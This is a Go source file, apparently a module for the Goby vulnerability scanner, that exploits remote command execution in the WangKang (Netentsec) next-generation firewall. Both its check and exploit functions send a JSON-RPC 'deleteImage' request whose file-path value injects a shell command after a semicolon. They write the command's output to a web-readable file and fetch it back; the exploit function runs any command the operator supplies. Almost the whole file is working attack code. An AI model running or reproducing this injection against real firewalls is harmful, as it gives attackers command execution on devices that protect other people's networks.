package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
  "Name": "WangKang Next generation firewall router RCE",
  "Description": "WangKang Next generation firewall router RCE",
  "Product": "WangKang Next generation firewall",
  "Homepage": "https://www.netentsec.com/",
  "DisclosureDate": "2021-05-18",
  "Author": "PeiQi",
  "GobyQuery": "(app=\"NETENTSEC-NGFW\" || title=\"网康下一代防火墙\")",
  "Level": "3",
  "Impact": "RCE",
  "Recommendation": "",
  "References": [
    "http://wiki.peiqi.tech"
  ],
  "HasExp": true,
  "ExpParams": [
    {
      "name": "Cmd",
      "type": "input",
      "value": "id"
    }
  ],
  "ScanSteps": [
    "AND",
    {
      "Request": {
        "data": "",
        "data_type": "text",
        "follow_redirect": true,
        "method": "GET",
        "uri": "/"
      },
      "ResponseTest": {
        "checks": [
          {
            "bz": "",
            "operation": "==",
            "type": "item",
            "value": "200",
            "variable": "$code"
          }
        ],
        "operation": "AND",
        "type": "group"
      }
    }
  ],
  "ExploitSteps": null,
  "Tags": ["RCE"],
  "CVEIDs": null,
  "CVSSScore": "0.0",
  "AttackSurfaces": {
    "Application": ["WangKang Next generation firewall"],
    "Support": null,
    "Service": null,
    "System": null,
    "Hardware": null
  }
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
		    uri_1 := "/directdata/direct/router"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/json")
			cfg_1.Data = "{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;id >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"}"
			if resp, err := httpclient.DoHttpRequest(u, cfg_1); err == nil {
        		if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "true") {
        		    uri_2 := "/test_cmd.txt"
        		    cfg_2 := httpclient.NewGetRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			if resp, err := httpclient.DoHttpRequest(u, cfg_2); err == nil {
        			    return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "uid")
        			}
        		}
        	}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
		    cmd := ss.Params["Cmd"].(string)
		    uri_1 := "/directdata/direct/router"
			cfg_1 := httpclient.NewPostRequestConfig(uri_1)
			cfg_1.VerifyTls = false
			cfg_1.FollowRedirect = false
			cfg_1.Header.Store("Content-type", "application/json")
			cfg_1.Data = "{\"action\":\"SSLVPN_Resource\",\"method\":\"deleteImage\",\"data\":[{\"data\":[\"/var/www/html/d.txt;" + cmd + " >/var/www/html/test_cmd.txt\"]}],\"type\":\"rpc\",\"tid\":17,\"f8839p7rqtj\":\"=\"}"
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_1); err == nil {
        		if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "true") {
        		    uri_2 := "/test_cmd.txt"
        		    cfg_2 := httpclient.NewGetRequestConfig(uri_2)
        			cfg_2.VerifyTls = false
        			cfg_2.FollowRedirect = false
        			cfg_2.Header.Store("Content-type", "application/x-www-form-urlencoded")
        			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg_2); err == nil {
        			    expResult.Output = resp.Utf8Html
        		        expResult.Success = true
        			}
        		}
        	}
			return expResult
		},
	))
}